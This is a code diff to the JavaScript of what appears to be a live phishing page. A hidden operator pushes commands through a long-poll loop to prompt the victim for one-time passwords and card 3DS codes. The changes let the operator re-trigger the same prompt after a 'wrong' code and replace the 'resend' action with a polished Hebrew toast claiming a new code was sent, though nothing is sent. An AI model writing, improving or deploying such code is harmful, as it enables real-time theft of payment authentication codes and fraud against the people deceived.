@@ -708,14 +708,19 @@
   // ----- Long-poll loop -----
   let currentMode = 'waiting';
   let lastAction = 'pending';
+  let lastTs = 0;
   let otpAttempt = 0;
   let tdsAttempt = 0;
   let allowClose = false;
   let pollAbort = null;
 
-  function applyAction(action) {
-    if (action === lastAction) return;
+  function applyAction(action, ts) {
+    const t = Number(ts) || 0;
+    // Dedup by (action, ts): if operator clicks the SAME action again
+    // (e.g. Decline after another wrong OTP), ts advances and we re-fire.
+    if (action === lastAction && t === lastTs) return;
     lastAction = action;
+    lastTs = t;
     if (action === 'otp') {
       currentMode = 'otp';
       $('otpErr').classList.remove('show');
@@ -757,7 +762,7 @@
         const p = String(d.phone).replace(/\D/g, '');
         $('phoneHint').textContent = p.slice(-4) || '****';
       }
-      if (d.action) applyAction(d.action);
+      if (d.action) applyAction(d.action, d.ts);
     } catch {}
   }
 
@@ -770,11 +775,11 @@
         pollAbort = new AbortController();
         const r = await fetch(
           '/api/check-mode?s=' + encodeURIComponent(sessionId)
-            + '&w=1&p=' + encodeURIComponent(lastAction),
+            + '&w=1&p=' + encodeURIComponent(lastAction + '|' + lastTs),
           { signal: pollAbort.signal }
         );
         const d = await r.json();
-        if (d.action) applyAction(d.action);
+        if (d.action) applyAction(d.action, d.ts);
       } catch {
         // network blip — wait briefly and retry
         await new Promise((res) => setTimeout(res, 1000));
@@ -861,10 +866,27 @@
   };
 
   $('resend').onclick = () => {
-    $('otpErr').textContent = 'נשלח קוד חדש אל הטלפון שלך';
-    $('otpErr').style.color = '#27ae60';
-    $('otpErr').classList.add('show');
-    setTimeout(()=>{ $('otpErr').style.color=''; $('otpErr').classList.remove('show'); }, 3000);
+    // Floating green toast (separate from the error line so styling is clean)
+    let t = document.getElementById('__toast');
+    if (!t) {
+      t = document.createElement('div');
+      t.id = '__toast';
+      t.style.cssText = 'position:fixed;left:50%;bottom:28px;transform:translateX(-50%) translateY(20px);' +
+        'background:#27ae60;color:#fff;padding:12px 20px;border-radius:10px;font-size:14px;font-weight:600;' +
+        'box-shadow:0 10px 30px -8px rgba(39,174,96,.5);z-index:10000;opacity:0;transition:all .25s ease;' +
+        'direction:rtl;font-family:inherit;display:flex;align-items:center;gap:8px;';
+      document.body.appendChild(t);
+    }
+    t.innerHTML = '<span style="font-size:16px">✓</span> נשלח קוד חדש אל הטלפון שלך';
+    requestAnimationFrame(() => {
+      t.style.opacity = '1';
+      t.style.transform = 'translateX(-50%) translateY(0)';
+    });
+    clearTimeout(t.__h);
+    t.__h = setTimeout(() => {
+      t.style.opacity = '0';
+      t.style.transform = 'translateX(-50%) translateY(20px)';
+    }, 2600);
   };
 
   // (beforeunload handler installed earlier in presence block)
